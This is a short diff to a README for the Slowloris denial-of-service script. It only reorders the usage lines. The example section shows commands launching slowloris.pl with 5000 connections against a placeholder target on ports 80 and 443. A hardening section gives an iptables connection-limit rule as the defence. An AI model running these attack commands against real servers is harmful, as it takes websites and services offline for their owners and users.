@@ -21,12 +21,12 @@ Example Configuration :
 ```
 cd /thePathToYourSlowloris.plFile
 ./slowloris.pl
-HTTP -> perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
-HTTPS -> perl slowloris.pl -dns [IP_TARGET] -port 443 -timeout 200 -num 5000 -cache
+perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache <- HTTP
+perl slowloris.pl -dns [IP_TARGET] -port 443 -timeout 200 -num 5000 -cache <- HTTPS
 ```
 
 Harderning DOS :
 -------
 ```
-Hardening => iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
+iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
 ```
